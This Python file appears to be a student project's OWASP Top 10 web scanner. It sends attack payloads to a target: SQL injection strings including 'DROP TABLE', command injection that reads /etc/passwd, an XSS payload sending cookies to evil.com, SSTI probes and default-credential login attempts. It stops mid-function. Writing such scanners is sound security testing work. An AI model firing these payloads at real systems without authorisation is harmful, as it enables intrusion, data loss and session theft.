"""
═══════════════════════════════════════════════════════════════
  CYBRAIN — OWASP Top 10 2021 Complete Check Module
  PFE Master 2 — Information Security
  Senior Pentester Level Implementation
═══════════════════════════════════════════════════════════════
"""

import requests
import re
import json
import base64
import time
import urllib3
from urllib.parse import urlparse, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/122.0.0.0 Safari/537.36"
)


class OWASPChecker:
    """
    Full OWASP Top 10 2021 implementation.
    Each method maps to one OWASP category.
    """

    def __init__(self, target_url, session, timeout=20):
        self.target  = target_url.split("#")[0].rstrip("/")
        self.base    = self._base(self.target)
        self.session = session
        self.timeout = timeout
        self.findings = []

    def _base(self, url):
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def _get(self, url, **kw):
        try:
            return self.session.get(
                url, timeout=self.timeout,
                verify=False, allow_redirects=True,
                headers={"User-Agent": BROWSER_UA}, **kw
            )
        except Exception:
            return None

    def _post(self, url, json_data=None, data=None,
              headers=None, **kw):
        h = {"User-Agent": BROWSER_UA}
        if headers:
            h.update(headers)
        try:
            return self.session.post(
                url, json=json_data, data=data,
                headers=h, timeout=self.timeout,
                verify=False, **kw
            )
        except Exception:
            return None

    def _add(self, owasp_id, owasp_name, severity,
             title, description, evidence="", fix="",
             cwe="", cvss=""):
        self.findings.append({
            "owasp_id":    owasp_id,
            "owasp_name":  owasp_name,
            "severity":    severity,
            "title":       title,
            "description": description,
            "evidence":    evidence,
            "fix":         fix,
            "cwe":         cwe,
            "cvss":        cvss,
            "target":      self.target,
        })

    def run_all(self):
        """Run all OWASP Top 10 checks."""
        print("[OWASP] Starting full Top 10 assessment...")
        
        resp = self._get(self.target)
        if resp is None:
            return self.findings

        # A01 — Broken Access Control
        self.check_a01_broken_access_control(resp)

        # A02 — Cryptographic Failures
        self.check_a02_cryptographic_failures(resp)

        # A03 — Injection (SQLi, XSS, Command, SSTI)
        self.check_a03_injection(resp)

        # A04 — Insecure Design
        self.check_a04_insecure_design(resp)

        # A05 — Security Misconfiguration
        self.check_a05_security_misconfiguration(resp)

        # A06 — Vulnerable Components
        self.check_a06_vulnerable_components(resp)

        # A07 — Auth Failures
        self.check_a07_auth_failures(resp)

        # A08 — Software & Data Integrity
        self.check_a08_integrity_failures(resp)

        # A09 — Logging Failures
        self.check_a09_logging_failures(resp)

        # A10 — SSRF
        self.check_a10_ssrf(resp)

        print(f"[OWASP] Done. Found {len(self.findings)} issues.")
        return self.findings

    # ────────────────────────────────────────────────────────── #
    #  A01 — BROKEN ACCESS CONTROL
    # ────────────────────────────────────────────────────────── #
    def check_a01_broken_access_control(self, resp):
        print("[A01] Checking Broken Access Control...")

        # 1. IDOR — increment object IDs
        idor_paths = [
            "/api/users/1", "/api/users/2",
            "/rest/user/1", "/user/1",
            "/account/1",   "/profile/1",
            "/order/1",     "/invoice/1",
        ]
        for path in idor_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200:
                body = r.text.lower()
                if any(s in body for s in
                       ["email","username","password",
                        "address","phone","credit"]):
                    self._add(
                        "A01", "Broken Access Control",
                        "HIGH",
                        "Insecure Direct Object Reference (IDOR)",
                        f"Endpoint {path} returns user data without "
                        "authorization check. Any user can access "
                        "other users' data by changing the ID.",
                        evidence=f"GET {self.base}{path} → 200 + user data",
                        fix="Implement server-side authorization checks. "
                            "Verify the authenticated user owns the "
                            "requested object. Use UUIDs instead of "
                            "sequential IDs.",
                        cwe="CWE-639", cvss="8.1"
                    )
                    break

        # 2. Admin panel accessible without auth
        admin_paths = [
            "/admin", "/admin/", "/administrator",
            "/admin/dashboard", "/admin/users",
            "/wp-admin", "/manager", "/console",
            "/api/admin", "/backend",
        ]
        for path in admin_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200:
                body = r.text.lower()
                if any(s in body for s in
                       ["dashboard","admin","manage",
                        "users","settings","panel"]):
                    self._add(
                        "A01", "Broken Access Control",
                        "CRITICAL",
                        f"Admin Panel Accessible: {path}",
                        f"The admin panel at {path} is accessible "
                        "without authentication. Full administrative "
                        "access is exposed to any user.",
                        evidence=f"GET {self.base}{path} → 200",
                        fix="Require authentication and admin role "
                            "verification for all admin routes. "
                            "Implement IP whitelisting for admin panels.",
                        cwe="CWE-284", cvss="9.8"
                    )
                    break

        # 3. Missing CSRF tokens
        if "<form" in resp.text.lower():
            has_csrf = any(t in resp.text.lower() for t in [
                "csrf", "_token", "xsrf",
                "authenticity_token", "requestverificationtoken"
            ])
            if not has_csrf:
                self._add(
                    "A01", "Broken Access Control",
                    "HIGH",
                    "Missing CSRF Protection",
                    "HTML forms found without CSRF tokens. "
                    "Attackers can forge requests on behalf of "
                    "authenticated users (password change, data "
                    "modification, fund transfer).",
                    fix="Add cryptographically random per-session CSRF "
                        "tokens to every state-changing form. Validate "
                        "server-side. Set SameSite=Strict on cookies.",
                    cwe="CWE-352", cvss="8.8"
                )

        # 4. HTTP method override
        for method_header in [
            "X-HTTP-Method-Override",
            "X-Method-Override",
            "X-HTTP-Method"
        ]:
            r = self._get(
                self.target,
                headers={method_header: "DELETE"}
            )
            if r and r.status_code not in [405, 501]:
                self._add(
                    "A01", "Broken Access Control",
                    "MEDIUM",
                    f"HTTP Method Override Accepted ({method_header})",
                    "Server accepts HTTP method override headers. "
                    "Attackers can bypass method-based access controls.",
                    evidence=f"{method_header}: DELETE → {r.status_code}",
                    fix="Disable HTTP method override headers unless "
                        "explicitly required. Validate methods at the "
                        "framework level.",
                    cwe="CWE-650", cvss="6.5"
                )
                break

    # ────────────────────────────────────────────────────────── #
    #  A02 — CRYPTOGRAPHIC FAILURES
    # ────────────────────────────────────────────────────────── #
    def check_a02_cryptographic_failures(self, resp):
        print("[A02] Checking Cryptographic Failures...")

        # 1. HTTP (no TLS)
        if self.target.startswith("http://"):
            self._add(
                "A02", "Cryptographic Failures",
                "HIGH",
                "Unencrypted HTTP Transmission",
                "Site served over HTTP. All data including passwords, "
                "session tokens, and personal information transmitted "
                "in plaintext. Vulnerable to MITM interception.",
                evidence=f"Protocol: HTTP (no TLS)",
                fix="Deploy TLS certificate (Let's Encrypt is free). "
                    "Force HTTPS redirect. Add HSTS header: "
                    "Strict-Transport-Security: max-age=31536000",
                cwe="CWE-319", cvss="7.5"
            )

        # 2. Insecure cookies
        raw_cookie = resp.headers.get("Set-Cookie", "")
        if raw_cookie:
            issues = []
            if "httponly" not in raw_cookie.lower():
                issues.append("HttpOnly missing (JS can steal cookie)")
            if "secure" not in raw_cookie.lower():
                issues.append("Secure missing (sent over HTTP)")
            if "samesite" not in raw_cookie.lower():
                issues.append("SameSite missing (CSRF risk)")
            if issues:
                self._add(
                    "A02", "Cryptographic Failures",
                    "HIGH",
                    "Insecure Cookie Attributes",
                    "Session cookies missing security flags:\n• "
                    + "\n• ".join(issues),
                    evidence=f"Set-Cookie: {raw_cookie[:150]}",
                    fix="Set-Cookie: session=VALUE; "
                        "HttpOnly; Secure; SameSite=Strict; Path=/",
                    cwe="CWE-1004", cvss="7.3"
                )

        # 3. Sensitive data in URL
        sensitive_params = [
            "password", "passwd", "pwd", "token",
            "secret", "api_key", "auth", "credit_card"
        ]
        url_lower = self.target.lower()
        for param in sensitive_params:
            if f"{param}=" in url_lower:
                self._add(
                    "A02", "Cryptographic Failures",
                    "HIGH",
                    f"Sensitive Data in URL ({param})",
                    f"Sensitive parameter '{param}' found in URL. "
                    "This data is logged in server logs, browser "
                    "history, and referrer headers.",
                    evidence=f"URL contains: {param}=",
                    fix="Never pass sensitive data in URL parameters. "
                        "Use POST body with HTTPS. Encrypt sensitive "
                        "data at rest and in transit.",
                    cwe="CWE-312", cvss="7.5"
                )
                break

        # 4. JWT analysis
        jwt_pattern = (
            r'eyJ[A-Za-z0-9_-]+\.'
            r'eyJ[A-Za-z0-9_-]+\.'
            r'[A-Za-z0-9_-]*'
        )
        text = resp.text + str(dict(resp.headers))
        match = re.search(jwt_pattern, text)
        if match:
            token = match.group(0)
            try:
                seg = token.split(".")[0]
                seg += "=" * (4 - len(seg) % 4)
                hdr = json.loads(
                    base64.urlsafe_b64decode(seg)
                )
                alg = hdr.get("alg", "")
                if alg.lower() == "none":
                    self._add(
                        "A02", "Cryptographic Failures",
                        "CRITICAL",
                        "JWT Algorithm None — Signature Bypass",
                        "JWT token uses alg:none — signature "
                        "verification is disabled. Attacker can "
                        "forge any token including admin tokens "
                        "without knowing the secret key.",
                        evidence=f"JWT header: {hdr}",
                        fix="Reject tokens with alg:none. "
                            "Enforce RS256/HS256 on server. "
                            "Maintain strict algorithm whitelist.",
                        cwe="CWE-347", cvss="9.8"
                    )
                elif alg in ("HS256","HS384","HS512"):
                    self._add(
                        "A02", "Cryptographic Failures",
                        "LOW",
                        f"JWT Symmetric Algorithm ({alg})",
                        f"JWT uses symmetric {alg}. If the secret "
                        "is weak it can be brute-forced offline.",
                        evidence=f"JWT alg: {alg}",
                        fix="Use RS256 asymmetric signing for "
                            "public APIs. Ensure secret is "
                            "256+ bits random.",
                        cwe="CWE-327", cvss="5.3"
                    )
            except Exception:
                pass

    # ────────────────────────────────────────────────────────── #
    #  A03 — INJECTION
    # ────────────────────────────────────────────────────────── #
    def check_a03_injection(self, resp):
        print("[A03] Checking Injection vulnerabilities...")

        # 1. SQL Injection — error-based
        db_errors = [
            "sql syntax", "mysql_fetch", "sqlite",
            "ora-", "pg_query", "microsoft ole db",
            "syntax error", "unclosed quotation",
            "you have an error in your sql",
            "warning: mysql", "jdbc", "sqlexception",
            "odbc", "db2", "division by zero",
            "quoted string not properly terminated",
        ]
        sqli_payloads = [
            ("'",                   "Single quote"),
            ("1' OR '1'='1",        "OR bypass"),
            ("1' ORDER BY 100--",   "ORDER BY probe"),
            ("' UNION SELECT NULL--","UNION probe"),
            ("admin'--",            "Comment bypass"),
            ("1; DROP TABLE test--","Stacked query"),
        ]
        found_sqli = False
        for payload, pname in sqli_payloads:
            for param in ["id", "user", "q", "search",
                          "page", "cat", "item", "product"]:
                p = urlparse(self.target)
                test_url = urlunparse((
                    p.scheme, p.netloc, p.path,
                    "", f"{param}={requests.utils.quote(payload)}", ""
                ))
                r = self._get(test_url)
                if r and any(e in r.text.lower() for e in db_errors):
                    self._add(
                        "A03", "Injection",
                        "CRITICAL",
                        "SQL Injection (Error-Based)",
                        f"SQL injection via parameter '{param}'. "
                        "Database error leaked in response. "
                        "Full DB extraction and auth bypass possible.",
                        evidence=f"?{param}={payload} → DB error",
                        fix="Use parameterized queries ONLY. "
                            "Never concatenate user input into SQL. "
                            "Apply least-privilege DB accounts. "
                            "Use a WAF as additional layer.\n"
                            "Python: cursor.execute("
                            "'SELECT * FROM t WHERE id=?', (id,))",
                        cwe="CWE-89", cvss="9.8"
                    )
                    found_sqli = True
                    break
            if found_sqli:
                break

        # 2. SQLi on login endpoints
        if not found_sqli:
            login_paths = [
                "/login", "/api/login",
                "/rest/user/login", "/auth/login",
                "/signin", "/user/login",
            ]
            sqli_creds = [
                {"email":    "' OR 1=1--",  "password": "x"},
                {"username": "admin'--",    "password": "x"},
                {"email":    "admin'--",    "password": "x"},
                {"user":     "' OR '1'='1", "password": "x"},
            ]
            for path in login_paths:
                for creds in sqli_creds:
                    r = self._post(
                        f"{self.base}{path}",
                        json_data=creds
                    )
                    if r and r.status_code == 200:
                        body = r.text.lower()
                        if any(s in body for s in [
                            "token", "authentication",
                            "success", "welcome", "logged",
                            "dashboard", "bearer"
                        ]):
                            self._add(
                                "A03", "Injection",
                                "CRITICAL",
                                "SQL Injection — Auth Bypass",
                                f"Login at {path} bypassed with "
                                "SQL injection payload. Full admin "
                                "access granted without credentials.",
                                evidence=(
                                    f"POST {path} "
                                    f"{list(creds.values())[0]} "
                                    "→ 200 + token"
                                ),
                                fix="Use parameterized queries. "
                                    "Hash passwords with bcrypt/argon2. "
                                    "Never build SQL from user input.",
                                cwe="CWE-89", cvss="9.8"
                            )
                            found_sqli = True
                            break
                if found_sqli:
                    break

        # 3. Reflected XSS
        xss_payloads = [
            "<script>alert('xss_cybrain')</script>",
            "<img src=x onerror=alert(1)>",
            '"><svg onload=alert(1)>',
            "<body onload=alert(1)>",
            "';alert(1)//",
            "<script>document.location='http://evil.com?c='"
            "+document.cookie</script>",
        ]
        xss_paths = [
            "/search", "/", "/query",
            "/find", "/results", "/index.php",
        ]
        found_xss = False
        for path in xss_paths:
            for payload in xss_payloads:
                p = urlparse(self.target)
                test_url = urlunparse((
                    p.scheme, p.netloc, path,
                    "", urlencode({
                        "q": payload,
                        "search": payload,
                        "query": payload
                    }), ""
                ))
                r = self._get(test_url)
                if r and payload in r.text:
                    self._add(
                        "A03", "Injection",
                        "HIGH",
                        "Reflected Cross-Site Scripting (XSS)",
                        f"XSS at {path}. User input returned "
                        "unencoded in HTML. Attacker can steal "
                        "session cookies, redirect victims, "
                        "or perform actions on their behalf.",
                        evidence=(
                            f"Path: {path} | "
                            f"Payload reflected: {payload[:50]}"
                        ),
                        fix="Apply context-aware output encoding. "
                            "Implement strict CSP. Use auto-escaping "
                            "templates. Validate all input server-side.\n"
                            "Python: markupsafe.escape(user_input)",
                        cwe="CWE-79", cvss="7.4"
                    )
                    found_xss = True
                    break
            if found_xss:
                break

        # 4. Command Injection
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "; cat /etc/passwd",
            "`id`",
            "$(id)",
            "; sleep 5",
        ]
        cmd_signs = [
            "root:", "bin/bash", "www-data",
            "uid=", "gid=", "total "
        ]
        for payload in cmd_payloads:
            for param in ["host", "ip", "cmd", "exec",
                          "ping", "query", "file"]:
                p = urlparse(self.target)
                test_url = urlunparse((
                    p.scheme, p.netloc, p.path,
                    "", f"{param}={requests.utils.quote(payload)}", ""
                ))
                r = self._get(test_url)
                if r and any(s in r.text for s in cmd_signs):
                    self._add(
                        "A03", "Injection",
                        "CRITICAL",
                        "OS Command Injection",
                        f"Command injection via '{param}' parameter. "
                        "System command output visible in response. "
                        "Full server compromise possible.",
                        evidence=(
                            f"?{param}={payload} "
                            "→ system output in response"
                        ),
                        fix="NEVER pass user input to OS commands. "
                            "Use language APIs instead of shell. "
                            "Whitelist allowed inputs. "
                            "Run app as low-privilege user.",
                        cwe="CWE-78", cvss="10.0"
                    )
                    break

        # 5. Server-Side Template Injection (SSTI)
        ssti_payloads = {
            "{{7*7}}":          "49",
            "${7*7}":           "49",
            "#{7*7}":           "49",
            "<%= 7*7 %>":       "49",
            "{{7*'7'}}":        "7777777",
            "${\"freemarker\"?upper_case}": "FREEMARKER",
        }
        for payload, expected in ssti_payloads.items():
            p = urlparse(self.target)
            test_url = urlunparse((
                p.scheme, p.netloc, p.path,
                "", urlencode({"q": payload, "name": payload}), ""
            ))
            r = self._get(test_url)
            if r and expected in r.text:
                self._add(
                    "A03", "Injection",
                    "CRITICAL",
                    "Server-Side Template Injection (SSTI)",
                    f"Template expression {payload} evaluated "
                    f"server-side (result: {expected}). "
                    "RCE is achievable in most template engines.",
                    evidence=(
                        f"Payload: {payload} "
                        f"→ Response contains: {expected}"
                    ),
                    fix="Never render user input as template code. "
                        "Use sandboxed template environments. "
                        "Validate and escape all user input before "
                        "passing to template engine.",
                    cwe="CWE-94", cvss="10.0"
                )
                break

    # ────────────────────────────────────────────────────────── #
    #  A04 — INSECURE DESIGN
    # ────────────────────────────────────────────────────────── #
    def check_a04_insecure_design(self, resp):
        print("[A04] Checking Insecure Design...")

        # 1. Password reset - user enumeration
        reset_paths = [
            "/forgot-password", "/reset-password",
            "/api/forgot", "/password/reset",
        ]
        for path in reset_paths:
            r_valid = self._post(
                f"{self.base}{path}",
                json_data={"email": "admin@test.com"}
            )
            r_invalid = self._post(
                f"{self.base}{path}",
                json_data={"email": "notexist_xyz@test.com"}
            )
            if (r_valid and r_invalid and
                    r_valid.status_code == r_invalid.status_code
                    and len(r_valid.text) != len(r_invalid.text)):
                self._add(
                    "A04", "Insecure Design",
                    "MEDIUM",
                    "User Enumeration via Password Reset",
                    f"Password reset at {path} returns different "
                    "responses for valid vs invalid emails. "
                    "Attackers can enumerate valid accounts.",
                    evidence=(
                        f"Valid email: {len(r_valid.text)} bytes | "
                        f"Invalid email: {len(r_invalid.text)} bytes"
                    ),
                    fix="Return identical responses for all password "
                        "reset requests regardless of email validity. "
                        "Add rate limiting to prevent enumeration.",
                    cwe="CWE-204", cvss="5.3"
                )
                break

        # 2. Rate limiting absent (brute force possible)
        login_path = None
        for path in ["/login", "/api/login",
                     "/rest/user/login", "/signin"]:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code in [200, 405]:
                login_path = path
                break

        if login_path:
            blocked = False
            for i in range(10):
                r = self._post(
                    f"{self.base}{login_path}",
                    json_data={
                        "email": f"test{i}@test.com",
                        "password": "wrongpassword"
                    }
                )
                if r and r.status_code == 429:
                    blocked = True
                    break
                time.sleep(0.3)

            if not blocked:
                self._add(
                    "A04", "Insecure Design",
                    "HIGH",
                    "No Rate Limiting on Login (Brute Force Risk)",
                    f"Login endpoint {login_path} does not enforce "
                    "rate limiting. 10 consecutive failed attempts "
                    "were not blocked. Password brute-force attacks "
                    "are possible.",
                    evidence=(
                        f"10 requests to {login_path} — "
                        "no 429 response received"
                    ),
                    fix="Implement rate limiting (max 5 attempts "
                        "per minute). Add account lockout after "
                        "N failures. Use CAPTCHA. Implement "
                        "progressive delays.",
                    cwe="CWE-307", cvss="7.5"
                )

    # ────────────────────────────────────────────────────────── #
    #  A05 — SECURITY MISCONFIGURATION
    # ────────────────────────────────────────────────────────── #
    def check_a05_security_misconfiguration(self, resp):
        print("[A05] Checking Security Misconfiguration...")

        # 1. Missing security headers
        required_headers = {
            "Content-Security-Policy":   ("HIGH",   "CWE-693"),
            "Strict-Transport-Security": ("HIGH",   "CWE-319"),
            "X-Frame-Options":           ("MEDIUM", "CWE-1021"),
            "X-Content-Type-Options":    ("MEDIUM", "CWE-693"),
            "X-XSS-Protection":          ("MEDIUM", "CWE-693"),
            "Referrer-Policy":           ("LOW",    "CWE-200"),
            "Permissions-Policy":        ("LOW",    "CWE-284"),
        }
        missing = [
            (h, s, c)
            for h, (s, c) in required_headers.items()
            if h not in resp.headers
        ]
        if missing:
            worst = (
                "HIGH" if any(s == "HIGH"
                              for _, s, _ in missing)
                else "MEDIUM"
            )
            self._add(
                "A05", "Security Misconfiguration",
                worst,
                "Missing HTTP Security Headers",
                "The following security headers are absent:\n• "
                + "\n• ".join(
                    f"{h} [{s}]" for h, s, _ in missing
                ),
                fix="Add to Apache httpd.conf or .htaccess:\n"
                    "Header always set Content-Security-Policy "
                    "\"default-src 'self'\"\n"
                    "Header always set Strict-Transport-Security "
                    "\"max-age=31536000; includeSubDomains\"\n"
                    "Header always set X-Frame-Options \"DENY\"\n"
                    "Header always set X-Content-Type-Options "
                    "\"nosniff\"",
                cwe="CWE-693", cvss="6.5"
            )

        # 2. Server version disclosure
        for h in ("Server", "X-Powered-By",
                  "X-AspNet-Version", "X-Generator"):
            if h in resp.headers:
                self._add(
                    "A05", "Security Misconfiguration",
                    "LOW",
                    f"Server Version Disclosure ({h})",
                    f"Header {h}: {resp.headers[h]} reveals "
                    "technology stack. Attackers use this to "
                    "target known CVEs.",
                    evidence=f"{h}: {resp.headers[h]}",
                    fix="Apache: ServerTokens Prod + "
                        "ServerSignature Off\n"
                        "Nginx: server_tokens off",
                    cwe="CWE-200", cvss="5.3"
                )

        # 3. Sensitive files exposed
        sensitive = {
            "/.env":           ("CRITICAL", "db_password|secret"),
            "/.git/config":    ("CRITICAL", "[core]"),
            "/.git/HEAD":      ("HIGH",     "ref:"),
            "/phpinfo.php":    ("HIGH",     "phpinfo"),
            "/server-status":  ("MEDIUM",   "apache"),
            "/.htaccess":      ("MEDIUM",   "rewrite"),
            "/backup.zip":     ("CRITICAL", ""),
            "/dump.sql":       ("CRITICAL", "insert into"),
            "/config.php":     ("CRITICAL", "password"),
            "/.DS_Store":      ("LOW",      ""),
            "/robots.txt":     ("LOW",      "user-agent"),
            "/crossdomain.xml":("MEDIUM",   "allow-access"),
            "/web.config":     ("HIGH",     "configuration"),
            "/swagger.json":   ("LOW",      "swagger"),
            "/api/swagger":    ("LOW",      "swagger"),
            "/.well-known/":   ("LOW",      ""),
        }
        for path, (sev, kw) in sensitive.items():
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200:
                content = r.text.lower()
                if not kw or any(
                    k in content for k in kw.split("|")
                ):
                    self._add(
                        "A05", "Security Misconfiguration",
                        sev,
                        f"Sensitive File Exposed: {path}",
                        f"Path {self.base}{path} is publicly "
                        "accessible. May expose credentials, "
                        "source code, or server config.",
                        evidence=(
                            f"GET {self.base}{path} → 200 "
                            f"({len(r.text)} bytes)"
                        ),
                        fix=f"Remove {path} from web root. "
                            "Add .htaccess rule to deny access. "
                            "Never store sensitive files in "
                            "public directories.",
                        cwe="CWE-200", cvss="7.5"
                    )

        # 4. Directory listing
        if ("Index of /" in resp.text and
                "<title>Index of" in resp.text):
            self._add(
                "A05", "Security Misconfiguration",
                "HIGH",
                "Directory Listing Enabled",
                "Server exposes raw file listing. Attackers "
                "can browse all files including source code "
                "and configuration files.",
                fix="Apache: Remove 'Options Indexes' and add "
                    "'Options -Indexes' to httpd.conf",
                cwe="CWE-548", cvss="7.5"
            )

        # 5. CORS wildcard
        acao = resp.headers.get(
            "Access-Control-Allow-Origin", ""
        )
        if acao == "*":
            self._add(
                "A05", "Security Misconfiguration",
                "MEDIUM",
                "CORS Wildcard Origin",
                "Access-Control-Allow-Origin: * allows any "
                "website to read responses. API keys and "
                "user data may be exposed to malicious sites.",
                evidence="Access-Control-Allow-Origin: *",
                fix="Restrict CORS to specific trusted origins. "
                 "Use a whitelist. Never combine wildcard "
                 "with credentials.",
                cwe="CWE-942", cvss="6.5"
            )

        # 6. Dangerous HTTP methods
        try:
            r = self.session.options(
                self.target, timeout=10, verify=False
            )
            allowed = (
                r.headers.get("Allow", "") +
                r.headers.get("Public", "")
            )
            dangerous = [
                m for m in
                ["TRACE", "PUT", "DELETE", "CONNECT"]
                if m in allowed.upper()
            ]
            if dangerous:
                self._add(
                    "A05", "Security Misconfiguration",
                    "MEDIUM",
                    f"Dangerous HTTP Methods: {', '.join(dangerous)}",
                    f"Methods {', '.join(dangerous)} are enabled. "
                    "TRACE allows XST attacks. PUT/DELETE may "
                    "allow unauthorized file operations.",
                    evidence=f"OPTIONS → Allow: {allowed}",
                    fix="Apache: LimitExcept GET POST "
                        "{ Deny from all }\n"
                        "Also add: TraceEnable Off",
                    cwe="CWE-16", cvss="5.8"
                )
        except Exception:
            pass

        # 7. Debug mode / error pages
        error_paths = [
            "/?debug=true", "/?test=1&debug=1",
            "/api?XDEBUG_SESSION_START=1",
        ]
        debug_signs = [
            "traceback", "stack trace", "debug mode",
            "exception at", "django debug",
            "werkzeug debugger", "rails debug"
        ]
        for path in error_paths:
            r = self._get(f"{self.base}{path}")
            if r and any(
                s in r.text.lower() for s in debug_signs
            ):
                self._add(
                    "A05", "Security Misconfiguration",
                    "HIGH",
                    "Debug Mode Enabled in Production",
                    "Application debug mode is active. Full "
                    "stack traces with file paths, variable "
                    "values, and internal logic are exposed.",
                    evidence=f"Debug indicators found at {path}",
                    fix="Set DEBUG=False in production. "
                        "Configure custom error pages. "
                        "Never expose stack traces to users.",
                    cwe="CWE-94", cvss="7.5"
                )
                break

    # ────────────────────────────────────────────────────────── #
    #  A06 — VULNERABLE COMPONENTS
    # ────────────────────────────────────────────────────────── #
    def check_a06_vulnerable_components(self, resp):
        print("[A06] Checking Vulnerable Components...")

        # Extract version info from headers and HTML
        version_patterns = {
            "Apache": r"Apache/([\d.]+)",
            "nginx": r"nginx/([\d.]+)",
            "PHP": r"PHP/([\d.]+)",
            "jQuery": r"jquery[/-]([\d.]+)",
            "Bootstrap": r"bootstrap[/-]([\d.]+)",
            "WordPress": r"wp-content|wordpress",
            "Drupal": r"drupal",
            "Joomla": r"joomla",
            "OpenSSL": r"OpenSSL/([\d.]+)",
        }

        all_text = (
            resp.text +
            str(dict(resp.headers)) +
            resp.url
        )

        for tech, pattern in version_patterns.items():
            match = re.search(
                pattern, all_text, re.IGNORECASE
            )
            if match:
                version = (
                    match.group(1)
                    if match.lastindex else "detected"
                )
                self._add(
                    "A06", "Vulnerable and Outdated Components",
                    "MEDIUM",
                    f"Technology Fingerprint: {tech} {version}",
                    f"{tech} version {version} detected. "
                    "Outdated components may have known CVEs. "
                    "Attackers use version info to find exploits.",
                    evidence=f"{tech} {version} in response",
                    fix=f"Keep {tech} updated to latest stable "
                        "version. Subscribe to security advisories. "
                        "Remove version from headers/responses. "
                        "Use a dependency scanner (OWASP Dependency "
                        "Check).",
                    cwe="CWE-1104", cvss="6.8"
                )

    # ────────────────────────────────────────────────────────── #
    #  A07 — AUTHENTICATION FAILURES
    # ────────────────────────────────────────────────────────── #
    def check_a07_auth_failures(self, resp):
        print("[A07] Checking Authentication Failures...")

        # 1. Default credentials
        default_creds = [
            ("admin",   "admin"),
            ("admin",   "password"),
            ("admin",   "123456"),
            ("admin",   "admin123"),
            ("root",    "root"),
            ("test",    "test"),
            ("guest",   "guest"),
            ("user",    "user"),
            ("demo",    "demo"),
            ("admin",   ""),
        ]
        login_paths = [
            "/login", "/api/login",
            "/rest/user/login", "/signin",
        ]
        for path in login_paths:
            for username, password in default_creds:
                for payload in [
                    {"username": username, "password": password},
                    {"email": f"{username}@example.com",
                     "password": password},
                    {"user": username, "pass": password},
                ]:
                    r = self._post(
                        f"{self.base}{path}",
                        json_data=payload
                    )
                    if r and r.status_code == 200:
                        body = r.text.lower()
                        if any(s in body for s in [
                            "token", "bearer", "success",
                            "dashboard", "welcome", "logged"
                        ]):
                            self._add(
                                "A07",
                                "Identification and Authentication Failures",
                                "CRITICAL",
                                "Default Credentials Accepted",
                                f"Application accepted default "
                                f"credentials {username}:{password} "
                                f"at {path}. Immediate admin access "
                                "granted without any exploitation.",
                                evidence=(
                                    f"POST {path} "
                                    f"{username}:{password} "
                                    "→ 200 + auth token"
                                ),
                                fix="Force password change on first "
                                    "login. Enforce strong password "
                                    "policy (12+ chars, mixed). "
                                    "Implement MFA. Account lockout "
                                    "after 5 failures.",
                                cwe="CWE-521", cvss="9.8"
                            )
                            return

        # 2. Weak session tokens
        cookies = dict(resp.cookies)
        for name, value in cookies.items():
            if any(
                k in name.lower()
                for k in ["session","sess","auth","token","sid"]
            ):
                if (len(value) < 16 or
                        value.isdigit() or
                        value.isalpha()):
                    self._add(
                        "A07",
                        "Identification and Authentication Failures",
                        "HIGH",
                        f"Weak Session Token: {name}",
                        f"Session token '{name}' appears weak or "
                        "predictable (length: {len(value)}). "
                        "Brute-force or prediction attacks possible.",
                        evidence=f"{name}={value[:20]}...",
                        fix="Use cryptographically secure random "
                            "tokens (256-bit minimum). Use framework "
                            "built-in session management. "
                            "Regenerate session on login.",
                        cwe="CWE-330", cvss="7.5"
                    )

    # ────────────────────────────────────────────────────────── #
    #  A08 — SOFTWARE AND DATA INTEGRITY FAILURES
    # ────────────────────────────────────────────────────────── #
    def check_a08_integrity_failures(self, resp):
        print("[A08] Checking Integrity Failures...")

        # 1. JS loaded from untrusted CDNs without SRI
        js_pattern = (
            r'<script[^>]+src=["\']'
            r'(https?://[^"\']+)["\'][^>]*>'
        )
        scripts = re.findall(
            js_pattern, resp.text, re.IGNORECASE
        )
        trusted = [
            "cdnjs.cloudflare.com",
            "ajax.googleapis.com",
            "cdn.jsdelivr.net",
            "unpkg.com",
        ]
        for src in scripts:
            is_external = not src.startswith(self.base)
            has_sri = "integrity=" in resp.text[
                resp.text.find(src) - 50:
                resp.text.find(src) + 100
            ]
            if is_external and not has_sri:
                self._add(
                    "A08",
                    "Software and Data Integrity Failures",
                    "MEDIUM",
                    "External Script Without SRI",
                    f"Script loaded from {src} without "
                    "Subresource Integrity (SRI) hash. "
                    "If CDN is compromised, malicious code "
                    "executes on all visitors.",
                    evidence=f"<script src=\"{src[:80]}\">",
                    fix="Add integrity attribute to all external "
                        "scripts:\n<script src=\"...\" "
                        "integrity=\"sha384-...\" "
                        "crossorigin=\"anonymous\">",
                    cwe="CWE-353", cvss="6.8"
                )
                if len([
                    f for f in self.findings
                    if f["title"] == "External Script Without SRI"
                ]) >= 3:
                    break

    # ────────────────────────────────────────────────────────── #
    #  A09 — LOGGING AND MONITORING FAILURES
    # ────────────────────────────────────────────────────────── #
    def check_a09_logging_failures(self, resp):
        print("[A09] Checking Logging/Monitoring...")

        # Check if error details are leaked (indicates poor logging)
        error_paths = [
            "/nonexistent_page_xyz_404",
            "/api/nonexistent",
        ]
        for path in error_paths:
            r = self._get(f"{self.base}{path}")
            if r:
                body = r.text.lower()
                if any(s in body for s in [
                    "stack trace", "traceback",
                    "at line", "exception in",
                    "debug", "internal error",
                    "file not found at"
                ]):
                    self._add(
                        "A09",
                        "Security Logging and Monitoring Failures",
                        "MEDIUM",
                        "Verbose Error Messages",
                        "Application returns detailed error messages "
                        "including stack traces, file paths, and "
                        "internal structure. This indicates poor "
                        "error handling and logging configuration.",
                        evidence=f"Verbose error at {path}",
                        fix="Configure custom error pages. "
                            "Log errors server-side only. "
                            "Never expose stack traces to users. "
                            "Implement centralized logging (ELK, "
                            "Splunk, CloudWatch).",
                        cwe="CWE-209", cvss="5.3"
                    )
                    break

        # Check if common log files are accessible
        log_paths = [
            "/logs/access.log",
            "/logs/error.log",
            "/log/app.log",
            "/application.log",
            "/debug.log",
            "/storage/logs/laravel.log",
        ]
        for path in log_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200 and len(r.text) > 100:
